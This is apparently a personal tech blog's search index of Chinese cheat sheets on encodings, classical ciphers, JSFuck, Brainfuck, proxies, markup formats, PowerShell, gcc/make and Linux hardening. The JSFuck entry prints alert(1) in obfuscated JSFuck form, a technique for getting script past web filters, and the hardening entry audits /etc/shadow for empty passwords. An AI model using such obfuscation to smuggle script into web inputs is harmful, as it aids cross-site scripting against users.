<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Base编码家族]]></title>
    <url>%2F2018%2F08%2F10%2Fbase%2F</url>
    <content type="text"><![CDATA[Base64Base64，顾名思义是一种基于64个可打印字符来表示二进制数据的表示方法，这64个字符分别为A-Z、a-z、0-9以及+与/。64个字符可用6个比特位表示，3个字节有24个比特位，对应于4个Base64单元，所以编码后的数据要比原始数据略长，为原来的4/3。Base64索引表如下所示： 数值 字符 数值 字符 数值 字符 数值 字符 0 A 16 Q 32 g 48 w 1 B 17 R 33 h 49 x 2 C 18 S 34 i 50 y 3 D 19 T 35 j 51 z 4 E 20 U 36 k 52 0 5 F 21 V 37 l 53 1 6 G 22 W 38 m 54 2 7 H 23 X 39 n 55 3 8 I 24 Y 40 o 56 4 9 J 25 Z 41 p 57 5 10 K 26 a 42 q 58 6 11 L 27 b 43 r 59 7 12 M 28 c 44 s 60 8 13 N 29 d 45 t 61 9 14 O 30 e 46 u 62 + 15 P 31 f 47 v 63 / 编码Hello的过程如下： 文本 H e l l o ASCII编码 72 101 108 108 111 二进制位 ‭01001000‬ ‭01100101‬ ‭01101100‬ ‭01101100‬ ‭01101111‬ 00000000 以6个二进制位进行编码： 二进制位 010010 000110 010101 101100 011011 000110 111100 000000 索引 18 6 21 44 27 6 60 Base64编码 S G V s b G 8 = 若原数据不是3的倍数，且多出1个字节，则在编码末尾加2个=，多出2个字节，则在编码末尾加1个=。换言之，若多出1个字节，则最后一个6位的Base64字节块有4位是0值，若多出2个字节，则最后一个6位的Base64字节块有2位是0值。 Base32与上类似，Base32基于32个可打印字符，分别为A-Z以及2-7。32个字符可用5个比特位表示，5个字节有40个比特位，对应于8个Base32单元，编码后的数据比原始数据略长8/5。若原数据不是5的倍数，且多出1个字节，则在编码末尾加4个=，多出2个字节，则在编码末尾加3个=，多出3个字节，则在编码末尾加2个=，多出4个字节，则在编码末尾加1个=。Base32索引表如下所示： 数值 字符 数值 字符 数值 字符 数值 字符 0 A 8 I 16 Q 24 Y 1 B 9 J 17 R 25 Z 2 C 10 K 18 S 26 2 3 D 11 L 19 T 27 3 4 E 12 M 20 U 28 4 5 F 13 N 21 V 29 5 6 G 14 O 22 W 30 6 7 H 15 P 23 X 31 7 Base16与上类似，Base16基于16个可打印字符，分别为0-9以及A-F。16个字符可用4个比特位表示，1个字节有8个比特位，对应于2个Base16单元，编码后的数据比原始数据略长2。显然，在Base16中不需要在末尾填充=。Base16索引表如下所示： 数值 字符 数值 字符 数值 字符 数值 字符 0 0 4 4 8 8 12 C 1 1 5 5 9 9 13 D 2 2 6 6 10 A 14 E 3 3 7 7 11 B 15 F XXencodeXXencode不属于Base编码家族，但与Base64编码极为类似，区别仅在于64个可打印字符及其顺序，XXencode使用的为+、-、0-9、A-Z、a-z。 UUencodeUUencode也与Base64极为类似，它使用的字符及其顺序为(space)、!、&quot;、#、$、%、&amp;、&#39;、(、)、*、+、,、-、.、/、0-9、:、;、&lt;、=、&gt;、?、@、A-Z、[、\、]、^、_、`。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[古典密码学]]></title>
    <url>%2F2018%2F08%2F10%2Fclassical-crypto%2F</url>
    <content type="text"><![CDATA[古典密码学主要包括两类，即代换和置换。 代换代换密码是将明文中的字符替代成其他字符，即替代转换，若整个加密过程中每个字符采用同一张表替代，则为单表代换密码，类似的，若整个加密过程中每个字符采用不同的表替代，则为多表代换密码，典型的单表代换密码有凯撒密码、培根密码等，多表代换密码有维吉尼亚密码等。 凯撒密码凯撒密码(Caesar cipher)就是将明文中的所有字母都在字母表上向后(或向前)按照一个固定数目进行偏移后被替换成密文。例如，当偏移量为3时，所有的字母A将被替换成D，B变成E，以此类推。明文Hello World的加密过程如下： 取偏移量为3 计算H的后3位为K 以此类推 密文为：Khoor Zruog 类似的，解密过程如下： 计算K的前3位为H 以此类推 明文为：Hello World 注意：当偏移量为13时，这种凯撒密码的特例又被称为ROT13(回转13位)加密，ROT13加密是一种对等加密(Reciprocal cipher)，对等加密是对称加密的一个特例，即该类密码的加密算法是它自己本身的逆反函数，换言之，要对其解密，只需对其密文再次套用加密算法即可。当偏移量未知时，可采用穷举法一个个试，偏移量必定小于26。 培根密码培根密码(Bacon’s cipher)加密时，明文中的每个字母都会转换成一组5个英文字母。其转换依靠下表： 明文 密文 明文 密文 明文 密文 明文 密文 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 按照上表，明文hello的密文为AABBBAABAAABABBABABBABBBA，显然，密文的长度是明文长度的5倍。除了上表用来加密小写明文外，还有一张用来加密大写明文的表，如下： 明文 密文 明文 密文 明文 密文 明文 密文 明文 密文 A aaaaa G aabba M abbaa S baaba Y bbaaa B aaaab H aabbb N abbab T baabb Z bbaab C aaaba I abaaa O abbba U babaa D aaabb J abaab P abbbb V babab E aabaa K ababa Q baaaa W babba F aabab L ababb R baaab X babbb 同理，明文HELLO的密文为aabbbaabaaababbababbabbba。注意：虽然表中出现了A B两种字符，但培根密码的本质是二进制，即用两种不同的特征来加密明文，可以是字母的大小写或字体的样式等等。例如采用字母的大小写加密hello为GOod gOOd STUdY, dAY dAy UP, haHa，其中大写代表A，小写代表B；类似的，也可以用粗体代表A，正常代表B，以字体的样式加密hello。显然，培根密码所包含的信息可以和用于承载其的文章完全无关。 维吉尼亚密码维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，用来加解密的维吉尼亚表格如下所示：这一表格包括了26行字母表，每一行都由前一行向左偏移1位得到。行为明文行，列为密钥列，密文位于表格内。明文HELLOWORLD的加密结果如下： 选择某一关键词作为密钥，如SECRET 对于明文第1个字母H，对应密钥的第1个字母S，于是使用表格中S行字母表进行加密，得到密文第一个字母Z 以此类推，若密钥长度小于明文长度，则转到密钥第1个字母继续循环，最终得到密文ZINCSPGVNU 类似的，解密过程如下： 根据密钥第1个字母S所对应的S行字母表，发现密文第1个字母Z位于H列，因而明文第1个字母为H 依次类推 显而易见，维吉尼亚密码相对于本文介绍的其他古典密码，很难利用穷举法破解。 置换置换密码是将明文中的字母重新排列，字母本身不变，但其位置改变，即位置转换，典型的有栅栏密码等。 栅栏密码栅栏密码(Rail fence cipher)，又称篱笆密码，就是把要加密的明文分成n个一组，然后把每组的第一个字连起来，紧接着把每组的第二个字连起来，以此类推，形成一段无规律的话。明文Hello World的加密过程如下： 去掉空格：HelloWorld 5个一组：Hello，World 取出每组第1个字母：HW 取出每组第2个字母：eo 以此类推 连在一起：HWeolrllod 加上适当空格：HWeol rllod 类似的，解密过程如下： 去掉空格：HWeolrllod 分成5栏：HW、eo、lr、ll、od 取出每栏第1个字母：Hello 依次类推 连在一起：HelloWorld 加上适当空格：Hello World 注意：这里栅栏的栏数取决于n的取值，一般而言，n要整除字母数，n不可能大于或等于字母数，当不知道n为多少时，可采用穷举法一个个试。 其他当铺密码准确来说，当铺密码不是一种加密方式而是一种编码方式，它是将中文和数字进行转化的算法，具体为：当前汉字有多少笔画出头，就转化成数字几。如王夫 井工 夫口 由中人即为67 84 70 123。 猪圈密码猪圈密码(Pigpen cipher)，又称共济会密码(Masonic cipher)，是一种以格子为基础的简单代换式密码。下图为猪圈密码中所用符号与26个英语字母之间的对应关系：明文X MARKS THE SPOT的加密结果如下：]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSFuck]]></title>
    <url>%2F2018%2F08%2F10%2Fjsfuck%2F</url>
    <content type="text"><![CDATA[JSFuck是一种JavaScript的编码方式，它的命名起源于Brainfuck，同样，为了避讳脏话，它又被写作JSF*ck，以JSFuck风格写出的代码不需要另外的编译器或解释器执行，原生的JavaScript解释器即可直接运行。JSFuck种共使用[、]、(、)、!、+这6种字符。alert(1)这段JavaScript代码用JSFuck风格表示如下所示：1[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() 要将任意的JavaScript代码编码为JSFuck风格，可前往JSFuck。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Brainfuck]]></title>
    <url>%2F2018%2F08%2F09%2FBrainfuck%2F</url>
    <content type="text"><![CDATA[Brainfuck是在1993年创建的一种极小化的计算机语言，由于fuck在英语中是脏话，这种语言有时也被称为Brainf*ck或Brainf***，或被简称为BF。Brainfuck中共有8种字符，它们及其含义如下所示： &gt;：指针加一 &lt;：指针减一 +：指针指向的字节的值加一 -：指针指向的字节的值减一 .：输出指针指向的单元内容(ASCII码) ,：输入内容到指针指向的单元(ASCII码) [：如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ]：如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 下面是一个用Brainfuck在屏幕上打印Hello World的程序例子：123++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;. 程序的运行结果如Brainfuck Visualizer所示。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《TAOUP》读书笔记]]></title>
    <url>%2F2018%2F08%2F02%2Ftaoup%2F</url>
    <content type="text"><![CDATA[我没有写错，本文所记述的不是Knuth的那本举世瞩目的TAOCP(计算机程序设计艺术)，而是ESR所写的TAOUP，即The Art of UNIX Programming(UNIX编程艺术)。 哲学Unix的设计哲学总体上可以概括为以下几点： 模块原则：使用简洁的接口拼合简单的部件 清晰原则：清晰胜于机巧 组合原则：设计时考虑拼接组合 分离原则：策略同机制分离，接口同引擎分离 简洁原则：设计要简洁，复杂度能低则低 吝啬原则：除非却无它法，不要编写庞大的程序 透明性原则：设计要可见，以便审查和调试 健壮原则：健壮源于透明与简洁 表示原则：把知识叠入数据以求逻辑质朴而健壮 通俗原则：接口设计避免标新立异 缄默原则：如果一个程序没什么好说的，就沉默 补救原则：出现异常时，马上退出并给出足够错误信息 经济原则：宁花机器一分，不花程序员一秒 生成原则：避免手工hack，尽量编写程序去生成程序 优化原则：雕琢前先要有原型，跑之前先学会走 多样原则：决不相信所谓“不二法门”的断言 扩展原则：设计着眼未来，未来总比预想来得快 所有的Unix哲学浓缩为一条铁律就是KISS原则，即Keep It Simple, Stupid！]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于代理那些事]]></title>
    <url>%2F2018%2F07%2F26%2Fabout-proxy%2F</url>
    <content type="text"><![CDATA[正向连接与反向连接正向连接即黑客主动连接受害者，这种情况下要求受害者有公网IP，常用于对服务器的渗透；反向连接即受害者主动连接黑客，这种情况下要求黑客有公网IP，常用于对个人的渗透。 正向代理与反向代理在英语中，Proxy表示服务器代理这种动作，而Agent表示代理服务器这种物质，显然，我们这里讨论的是Proxy这种动作，而非代理服务器本身。不论正向还是反向，代理都是基于这样一个事实：即A与B的通信要经过C的转发，这里的C就是Agent，为了方便讨论，我们将A视为客户端，将B视为服务器端。正向代理(Forward Proxy)：也就是常说的代理，代理服务器偏向于客户端，服务器端只能得到代理服务器的IP地址，隐藏了客户端的IP地址。常用于科学上网工具。反向代理(Reverse Proxy)：代理服务器偏向于服务器端，客户端只能得到代理服务器的IP地址，隐藏了服务器端的IP地址。常用于网站镜像等。 端口转发与端口映射传统意义上，我们认为端口转发(Port Forwarding)与端口映射(Port Mapping)表达同样的内容。顾名思义，端口转发指的是将某个IP的某个端口转发到另一个IP的另一个端口，这样，可以通过访问后者以达到访问前者的目的。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML、JSON与YAML]]></title>
    <url>%2F2018%2F07%2F21%2Fxml-json-yaml%2F</url>
    <content type="text"><![CDATA[XML、JSON与YAML是三种常见的信息标记形式，这三者由于其特有的属性而在不同的领域广为使用。 XMLXML，Extensible Markup Language(可扩展标记语言)，倘若我要表示某个人的简要信息，用XML可写为：12345678910&lt;person&gt; &lt;firstName&gt;Tian&lt;/firstName&gt; &lt;lastName&gt;Song&lt;/lastName&gt; &lt;address&gt; &lt;streetAddr&gt;中关村南大街5号&lt;/streetAddr&gt; &lt;city&gt;北京市&lt;/city&gt; &lt;zipcode&gt;100081&lt;/zipcode&gt; &lt;/address&gt; &lt;prof&gt;Computer System&lt;/prof&gt;&lt;prof&gt;Security&lt;/prof&gt;&lt;/person&gt; JSONJSON，JavaScript Object Notation(JavaScript对象表示法)，倘若我要表示某个人的简要信息，用JSON可写为：12345678910&#123; &quot;firstName&quot; : &quot;Tian&quot;, &quot;lastName&quot; : &quot;Song&quot;, &quot;address&quot; : &#123; &quot;streetAddr&quot; : &quot;中关村南大街5号&quot;, &quot;city&quot; : &quot;北京市&quot;, &quot;zipcode&quot; : &quot;100081&quot; &#125;, &quot;prof&quot; : [&quot;Computer System&quot;, &quot;Security&quot;]&#125; YAMLYAML，在开发这种语言之初，其意为Yet Another Markup Language(仍是一种标记语言)，之后为了强调这种语言以数据作为中心，而不是以标记语言为重点，故解释为YAML Ain’t a Markup Language(YAML不是一种标记语言)，倘若我要表示某个人的简要信息，用YAML可写为：123456789firstName : TianlastName : Songaddress : streetAddr : 中关村南大街5号 city : 北京市 zipcode : 100081prof : -Computer System-Security 比较XML是最早的通用信息标记语言，可扩展性好，但繁琐，主要用于Internet上的信息交互与传递，以及用户界面的编写，比如Android；JSON中的信息有类型，适合程序处理(js)，较XML简洁，主要用于移动应用云端和节点的信息通信，无注释；YAML信息无类型，文本信息比例最高，可读性好，主要用于各类系统的配置文件，有注释易读。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Markdown小记]]></title>
    <url>%2F2018%2F07%2F21%2Fmarkdown-cheatsheet%2F</url>
    <content type="text"><![CDATA[Markdown是一种轻量标记语言，它允许人们采用其规定的语法编写文档，而后Markdown解析器会将其转化为有效的HTML文档，以便在网页中显示，时至今日，有许多Markdown解析器增强了Markdown的基本语法。 基本语法标题# 一级标题#### 四级标题对应HTML，最高6级标题。 列表- 无序列表项- 无序列表项- 无序列表项 1. 有序列表项2. 有序列表项3. 有序列表项 链接[Howie’s Blog](http://howiezhao.com)超文本链接必须带http。 图片![一张图片](/images/abc.jpg)当图片无法显示时，则显示中括号中的语句。图片的路径为相对路径，即当前markdown文件所在路径下的images中的abc.jpg。 字体*斜体***粗体** 代码```这里是多行代码``` `这里是单行代码` 表格表头1 | 表头2-– | -–单元格1 | 单元格2单元格3 | 单元格4 引用> 这是引用 横线-–，这是一条水平区分线，用3个或以上的短横线表示 转义和传统编程语言一样，markdown使用 \ 转义以上特殊字符。 最佳实践 在特殊字符与要书写的文字之间加上空格 不同段之间加一空行 GitHub Flavored MarkdownGitHub Flavored Markdown，简记为GFM，即GitHub风格的Markdown语法，是GitHub中编辑器使用的Markdown语法格式，略微区别于标准的Markdown语法，主要如下： 链接自动识别：GFM会自动为标准的URL加上链接 语法着色：在```后输入语言，即可着色 删除线：使用~~表示删除线 任务列表：使用- []或- [1]表示未勾选或已勾选的列表]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Udacity：Apollo起步学习笔记]]></title>
    <url>%2F2018%2F07%2F21%2Fudacity-apollo%2F</url>
    <content type="text"><![CDATA[本笔记记录自ud0419-无人驾驶第一课：从Apollo起步。 一、无人驾驶概览无人驾驶车的6个等级： 0级——基本等级：驾驶员是系统的唯一决策者。 1级——驾驶员辅助(Driver Assistance)：车辆为驾驶员提供转向或加速支持，驾驶员必须保持充分参与。 2级——部分自动化(Partial Automation)：车辆自动控制几项功能，如自动巡航控制和车道保持，但是驾驶员仍然必须执行自治系统处理的任何功能。 3级——有条件的自动化(Conditional Automation)：车辆自主驾驶，但驾驶员必须准备在必要的时候随时接管。 4级——高度自动化(No Human Interference)：车辆控制驾驶体验的所有面面，并且不期望驾驶员的介入，车辆可能根本没有方向盘或任何驾驶员控制装置，但是车辆可能被限制在某些区域，通常这被称为“地理围栏”，车辆可以在特定的地理围栏内完全自主的运行，但是在地理围栏之外，车辆不能自主操作，或者根本无法操作。 5级——完全自动化(Full Automation)：车辆可以在人类可以驾驶的任何地方完全自主地运行，在所有情况下应与人类驾驶员的水平一样高或比其更高。 无人驾驶车的5个核心部件： 计算机视觉(Computer Vision)：通过摄像头图像弄清楚我们周围的世界是怎样的。 传感器融合(Sensor Fusion)：合并来自其他传感器的数据，如激光和雷达，从而更加深入的了解我们周围的环境。 定位(Localization)：精确的确定我们在那个世界所处的位置。 路径规划(Path Planning)：绘制这个世界的路线，帮助我们到达我们想去的地方。 控制(Control)：为了让汽车沿着我们在路径规划期间建立的轨道。 Apollo技术框架包含的4个层面： 参考车辆平台 参考硬件平台 开源软件平台 云服务平台 二、高精度地图]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>无人驾驶</tag>
        <tag>Apollo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于PowerShell]]></title>
    <url>%2F2018%2F07%2F16%2Fabout-powershell%2F</url>
    <content type="text"><![CDATA[PowerShell是微软用来取代CMD的一个强大的Shell。 版本在不同版本的Windows中已经内置了不同版本的PowerShell，常见情况如下： Windows XP SP2 / Server 2003 SP1：PowerShell 1.0 Windows 7 / Server 2008：PowerShell 2.0，此版本包含了PowerShell ISE，即Integrated Scripting Environment(集成的脚本环境)，用来方便的编写PowerShell脚本。 Windows 8 / Server 2012：PowerShell 3.0，从此版本开始，PowerShell被集成进了WMF中，即Windows Management Framework(Windows管理框架)。 Windows 8.1 / Server 2012 R2：PowerShell 4.0 Windows 10：PowerShell 5.0，此版本的WMF包含了PowerShellGet，可用于在线下载、安装模块。 优势及劣势PowerShell相较于CMD的优势是不言而喻的，相较于Unix中的Shell，它的优势主要体现在2方面：面向对象特性以及与.NET的深度结合。劣势当然也有，相较于CMD，至今为止它的启动速度仍然较慢，相较于Unix中的Shell，它的生态环境还欠火候，可以期待未来有更多的人关注到PowerShell。 Cmdlets与pipelineCmdlets与pipeline是PowerShell中的两个核心概念， 常用命令PowerShell中的大多数常用命令都有对应于Linux中相关命令的别名，比如ls、mv、ps、cat、kill、wget等，下面介绍的命令为PowerShell所不同于Linux中的命令。1234Get-Host #查看PowerShell版本信息help #查看帮助信息Install-Module #从powershellgallery.com下载安装第三方模块Import-Module #导入模块，安装的模块需要先导入才能使用 常用模块 posh-git：PowerShell中的Git增强模块 oh-my-posh：类似于oh-my-zsh PSReadline：一个增强的命令行编辑模块 windows-screenfetch：Windows下的screenfetch模块]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows10的传递优化]]></title>
    <url>%2F2018%2F07%2F16%2Fdelivery-optimization%2F</url>
    <content type="text"><![CDATA[为了方便快速的下载Windows更新，微软在Windows10中启用了一种新的更新机制，即传递优化(Delivery Optimization)，这本质上是一种P2P架构，换句话来说，倘若开启了传递优化功能，更新时将会额外的从别的已更新的且开启传递优化功能的电脑上下载，同时也会上传已更新的文件到需要更新的电脑上。值得注意的是，传递优化对局域网进行了特殊处理，即当局域网内一台电脑完成更新后，传递优化会使得此局域网内的其他电脑依次完成更新。开启或关闭传递优化的设置路径为：设置 ——&gt; 更新和安全 ——&gt; Windows更新 ——&gt; 高级选项 ——&gt; 传递优化。传递优化用于上传的文件路径位于：C:\Windows\Logs\dosvc。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[useradd与adduser]]></title>
    <url>%2F2018%2F07%2F16%2Fuseradd-adduser%2F</url>
    <content type="text"><![CDATA[在Linux中创建用户可以用useradd或者adduser，值得注意的是创建的用户并不一定可以登录，登录的用户肯定要有它的用户主目录、登录Shell等相关配置，而这两个命令之间的差异就在于此。 adduser当使用adduser howie命令时，系统除了创建howie用户，还会自动创建用户主目录、同名用户组、登录Shell等，并提示输入用户密码，这一切操作都将以一个对话的形式完成。 useradd当使用useradd howie命令时，系统只会创建howie用户，而不会创建用户密码、用户主目录、同名用户组、登录shell等，若要指定密码，可以接着采用passwd howie命令。其次，useradd有众多参数，我们可以通过使用这些参数来达到和adduser一样的效果，如useradd -d /home/howie -m -s /bin/bash howie，不过注意之后还得使用passwd命令创建密码，当然也可以使用-p参数直接设置密码，但这样会将密码直接显示在终端屏幕上，不安全。 userdel当使用userdel howie命令时，系统只会删除howie用户，并不会删除用户主目录以及用户邮箱目录，因此可以使用-r参数。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[云服务的三种模式]]></title>
    <url>%2F2018%2F07%2F15%2Fxaas%2F</url>
    <content type="text"><![CDATA[云服务的模式一般有IaaS、PaaS、SaaS三种，既然是云服务，也即我们不用购买真实的计算设备，所有的模式都是基于此之上的。 IaaSIaaS，Infrastructure as a Service(基础设施即服务)，云服务的最底层，服务商提供操作系统、存储设施、硬件配置等资源，典型的例子是VPS，即Virtual Private Server(虚拟专用服务器)，这类服务一般提供必要的Shell接口，可使用户连接到操作系统进行相关配置，常见的VPS厂商有Amazon EC2、阿里云 ECS等。 PaaSPaaS，Platform as a Service(平台即服务)，云服务的中间层，服务商提供必要的应用，用户无权访问操作系统及硬件等资源，典型的例子是虚拟空间，这类服务一般会提供必要的Web服务器、数据库等，用户可以直接在其上部署Web应用，我用过的虚拟空间有老薛主机，常见的PaaS厂商有Google App Engine。 SaaSSaaS，Software as a Service(软件即服务)，云服务的最高层，直接提供现成的应用供用户使用，用户所付出的精力最少，例如本站采用的Hexo、WordPress等。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[编译与构建]]></title>
    <url>%2F2018%2F07%2F15%2Fcompile-build%2F</url>
    <content type="text"><![CDATA[编译编译(compile)，一般而言是将源代码转换成汇编代码，用以实现这种过程的工具称为编译器(compiler)。但要注意，编译器在同一时刻只能转换一个编译单元，所谓编译单元是指单个的源文件。目前在Linux中使用最广的编译器是GCC，即GNU Compiler Collection(GNU编译器套装)，GCC的原名为GNU C Compiler(GNU C语言编译器)，因为在后续逐渐支持了C++、Java等更多的语言，所以更改了其缩写的含义。使用GCC编译C语言源代码的一般格式如下：1$ gcc test.c -o test 若不指定生成文件，则默认生成a.out。 构建程序通常由多个编译单元组成，倘若逐个的去编译，这多少显得有点琐碎，因此我们需要一个自动化工具用来从源代码生成用户可以使用的目标，而这个工具就是构建系统(build system)，构建系统所作的就是构建(build)，构建的过程中肯定会调用到编译。从这个意义上来说，构建的范围比编译更广。在Linux中使用最广的构建系统是GNU make，它会读取makefile文件中的配置信息来完成构建，makefile的简要格式如下：12345678editor : main.o text.o gcc -o editor main.o text.omain.o : main.c def.h gcc -c main.c #-c参数指定生成.o文件text.o : text.c com.h gcc -c text.cinstall : editor mv editor /usr/local 冒号前面为target，即要生成的文件；冒号后面为dependencies，即被依赖的文件；每一个target:dependencies对的下一行为要执行的命令。当make不带参数时，默认执行第一个target。target也可以是要求make要完成的动作，执行这种target后并不能得到和target同名的文件，因此，也称做伪target，如第7行所示。dependencies可以为空，如常用的target为clean时，就没有依赖，只有命令。当输入make或make editor，即可开始构建。若editor这个target文件不存在，或者main.o、text.o这两个依赖文件被修改，都会导致make调用其下的命令gcc -o editor main.o text.o；接下来，由于引用到main.o和text.o，make会检查main.o的依赖main.c、def.h有无更新，如果有，则执行其下的命令gcc -c main.c；同理，也适用于text.o。当输入make install，make会检查install的依赖editor是否是最新，如果是，则执行其下的命令mv editor /usr/local。makefile中也可以包含宏，上面的文件使用宏后如下所示：12345678910OBJECTS = main.o text.oINSTALL_PATH = /usr/localeditor : $(OBJECTS) gcc -o editor $(OBJECTS)main.o : main.c gcc -c main.ctext.o : text.c gcc -c text.cinstall : editor mv editor $(INSTALL_PATH) 另外的为了在Windows中使用GCC，诞生了MinGW 项目，即Minimalist GNU for Windows(适用于Windows的极简GNU)，它是将GCC编译器和GNU Binutils移植到Win32平台下的产物，又被称为mingw32。另有可用于产生32位及64位Windows可执行文件的MinGW-w64项目，是从原MinGW项目产生的分支。Java世界中使用最广的构建系统是Maven，而在Android Studio中则使用到了后起之秀Gradle。C语言从源代码到可执行文件的过程依次经过了预处理、编译、链接这几个步骤，即我们常说的GCC是编译器，但它实际可以完成的工作不止是编译，具体生成结果取决于我们的参数。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux系统加固]]></title>
    <url>%2F2018%2F05%2F19%2Flinux-reinforcement%2F</url>
    <content type="text"><![CDATA[帐户与口令此方面的加固主要为了防止针对帐户的暴力破解。 禁用或删除无用帐户：使用命令userdel &lt;用户名&gt;删除不必要的帐户，使用参数-r即可删除相应用户的家目录和邮箱目录。使用命令passwd -l &lt;用户名&gt;锁定不必要的帐户，解锁可使用passwd -u &lt;用户名&gt;。 检查特殊帐户：使用命令awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow查看空口令帐户，若存在，则使用命令passwd &lt;用户名&gt;为空口令帐户设定密码。使用命令awk -F: &#39;($3==0)&#39; /etc/passwd查看uid为0的帐户，确认uid为0的帐户只有root帐户。 添加口令策略：使用命令change -m 0 -M 30 -E 2020-01-01 -W 7 &lt;用户名&gt;修改帐户口令策略，-m表示密码最小使用天数，-M表示密码最大使用天数，-E表示密码到期时间，-W表示密码到期前多少天提醒。或者可以直接编辑/etc/login.defs文件进行修改。 设置用户锁定：在CentOS7中，编辑/etc/pam.d/system-auth文件，添加auth required pam_tally2.so onerr=fail deny=6 unlock_time=300此行，表示当密码连续输错6次后锁定，锁定时间300秒。限制能su到root的用户：编辑/etc/pam.d/su文件，添加auth required pam_wheel.so group=test此行，表示只允许test组用户su到root。 服务安全服务越少，系统越安全。 关闭不必要的服务：在CentOS中，使用命令chkconfig --level &lt;init级别&gt; &lt;服务名&gt; on|off|reset设置服务在指定init级别下开机是否启动。 SSH服务安全：编辑/etc/ssh/sshd_config文件，修改默认端口，即Port项；禁止root用户远程登录，即PermitRootLogin项；禁止空密码登录，即PermitEmptyPasswords项；限制登录密码输错次数。 文件系统安全权限越小，系统越安全 设置umask值：编辑/etc/profile文件，修改umask值为027。 设置登录超时：编辑/etc/profile文件，添加TIMEOUT=180，即登录后无操作3分钟将超时断开连接。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows系统加固]]></title>
    <url>%2F2018%2F05%2F19%2Fwindows-reinforcement%2F</url>
